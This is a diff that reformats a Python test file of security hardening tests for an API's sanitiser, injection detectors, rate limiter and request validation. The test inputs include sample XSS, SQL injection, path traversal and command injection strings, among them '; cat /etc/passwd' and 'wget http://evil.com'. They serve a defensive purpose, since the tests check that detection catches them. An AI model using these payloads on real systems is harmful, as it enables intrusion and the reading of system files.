@@ -1,6 +1,7 @@
 """
 Security hardening tests.
 """
+
 from __future__ import annotations
 
 import pytest
@@ -12,11 +13,11 @@ class TestInputValidationMiddleware:
     def test_sanitize_string_escapes_html(self):
         from src.api.routes import _sanitize_string
 
-        malicious = '<script>alert(1)</script>'
+        malicious = "<script>alert(1)</script>"
         safe = _sanitize_string(malicious)
         # html.escape converts < to &lt; and > to &gt;
-        assert '&lt;script&gt;' in safe
-        assert '<script>' not in safe
+        assert "&lt;script&gt;" in safe
+        assert "<script>" not in safe
 
     def test_sanitize_string_removes_control_chars(self):
         from src.api.routes import _sanitize_string
@@ -44,7 +45,7 @@ class TestInputValidationMiddleware:
             current["level"] = {}
             current = current["level"]
         current["value"] = "test"
-        
+
         assert _validate_json_depth(obj, max_depth=10) is False
 
     def test_validate_json_depth_allows_shallow_nesting(self):
@@ -54,33 +55,67 @@ class TestInputValidationMiddleware:
         assert _validate_json_depth(shallow, max_depth=10) is True
 
     def test_check_injection_patterns_detects_sql(self):
-        from src.api.routes import _check_injection_patterns, SQL_INJECTION_PATTERNS
+        from src.api.routes import SQL_INJECTION_PATTERNS, _check_injection_patterns
 
         assert _check_injection_patterns("' OR 1=1 --", SQL_INJECTION_PATTERNS, "SQL") is True
-        assert _check_injection_patterns("UNION SELECT * FROM users", SQL_INJECTION_PATTERNS, "SQL") is True
+        assert (
+            _check_injection_patterns("UNION SELECT * FROM users", SQL_INJECTION_PATTERNS, "SQL")
+            is True
+        )
         assert _check_injection_patterns("normal query", SQL_INJECTION_PATTERNS, "SQL") is False
 
     def test_check_injection_patterns_detects_xss(self):
-        from src.api.routes import _check_injection_patterns, XSS_PATTERNS
+        from src.api.routes import XSS_PATTERNS, _check_injection_patterns
 
         assert _check_injection_patterns("<script>alert(1)</script>", XSS_PATTERNS, "XSS") is True
         assert _check_injection_patterns("javascript:alert(1)", XSS_PATTERNS, "XSS") is True
         assert _check_injection_patterns("safe text", XSS_PATTERNS, "XSS") is False
 
     def test_check_injection_patterns_detects_path_traversal(self):
-        from src.api.routes import _check_injection_patterns, PATH_TRAVERSAL_PATTERNS
+        from src.api.routes import PATH_TRAVERSAL_PATTERNS, _check_injection_patterns
 
-        assert _check_injection_patterns("../../../etc/passwd", PATH_TRAVERSAL_PATTERNS, "Path Traversal") is True
-        assert _check_injection_patterns("..\\windows\\system32", PATH_TRAVERSAL_PATTERNS, "Path Traversal") is True
-        assert _check_injection_patterns("safe/path", PATH_TRAVERSAL_PATTERNS, "Path Traversal") is False
+        assert (
+            _check_injection_patterns(
+                "../../../etc/passwd", PATH_TRAVERSAL_PATTERNS, "Path Traversal"
+            )
+            is True
+        )
+        assert (
+            _check_injection_patterns(
+                "..\\windows\\system32", PATH_TRAVERSAL_PATTERNS, "Path Traversal"
+            )
+            is True
+        )
+        assert (
+            _check_injection_patterns("safe/path", PATH_TRAVERSAL_PATTERNS, "Path Traversal")
+            is False
+        )
 
     def test_check_injection_patterns_detects_command_injection(self):
-        from src.api.routes import _check_injection_patterns, COMMAND_INJECTION_PATTERNS
+        from src.api.routes import COMMAND_INJECTION_PATTERNS, _check_injection_patterns
 
-        assert _check_injection_patterns("; cat /etc/passwd", COMMAND_INJECTION_PATTERNS, "Command Injection") is True
-        assert _check_injection_patterns("`whoami`", COMMAND_INJECTION_PATTERNS, "Command Injection") is True
-        assert _check_injection_patterns("wget http://evil.com", COMMAND_INJECTION_PATTERNS, "Command Injection") is True
-        assert _check_injection_patterns("normal command", COMMAND_INJECTION_PATTERNS, "Command Injection") is False
+        assert (
+            _check_injection_patterns(
+                "; cat /etc/passwd", COMMAND_INJECTION_PATTERNS, "Command Injection"
+            )
+            is True
+        )
+        assert (
+            _check_injection_patterns("`whoami`", COMMAND_INJECTION_PATTERNS, "Command Injection")
+            is True
+        )
+        assert (
+            _check_injection_patterns(
+                "wget http://evil.com", COMMAND_INJECTION_PATTERNS, "Command Injection"
+            )
+            is True
+        )
+        assert (
+            _check_injection_patterns(
+                "normal command", COMMAND_INJECTION_PATTERNS, "Command Injection"
+            )
+            is False
+        )
 
 
 class TestVectorStoreValidation:
@@ -93,7 +128,7 @@ class TestVectorStoreValidation:
         result = sanitize_string(malicious)
         assert "<script>" not in result
         assert "javascript:" not in result
-        assert 'onload=' not in result
+        assert "onload=" not in result
 
     def test_sanitize_string_limits_length(self):
         from src.memory.vector_store import sanitize_string
@@ -220,16 +255,17 @@ class TestRateLimiterCleanup:
     """Tests for rate limiter periodic cleanup."""
 
     def test_cleanup_removes_expired_entries(self):
-        from src.api.rate_limiter import SlidingWindowRateLimiter
         import time
 
+        from src.api.rate_limiter import SlidingWindowRateLimiter
+
         limiter = SlidingWindowRateLimiter(max_requests=10, window_seconds=1)
-        
+
         # Add some timestamps
         now = time.time()
         limiter._clients["client1"] = [now - 2, now - 1]  # Both expired
         limiter._clients["client2"] = [now - 0.5]  # Not expired
-        
+
         removed = limiter._cleanup_old_entries()
         assert removed == 2
         assert "client1" not in limiter._clients
@@ -264,15 +300,17 @@ class TestValidatedResearchRequest:
         assert req.question == "What is quantum computing?"
 
     def test_empty_question_rejected(self):
-        from src.models.api import ResearchRequest
         from pydantic import ValidationError
+
+        from src.models.api import ResearchRequest
 
         with pytest.raises(ValidationError):
             ResearchRequest(question="")
 
     def test_question_too_long_rejected(self):
-        from src.models.api import ResearchRequest
         from pydantic import ValidationError
+
+        from src.models.api import ResearchRequest
 
         with pytest.raises(ValidationError):
             ResearchRequest(question="a" * 3000)
@@ -287,15 +325,17 @@ class TestValidatedResearchRequest:
         assert "<script>alert(1)</script>" in req.question
 
     def test_tags_limit_enforced(self):
-        from src.models.api import ResearchRequest
         from pydantic import ValidationError
+
+        from src.models.api import ResearchRequest
 
         with pytest.raises(ValidationError):
             ResearchRequest(question="valid question", tags=["tag"] * 15)
 
     def test_tag_length_enforced(self):
-        from src.models.api import ResearchRequest
         from pydantic import ValidationError
+
+        from src.models.api import ResearchRequest
 
         with pytest.raises(ValidationError):
             ResearchRequest(question="valid question", tags=["a" * 60])
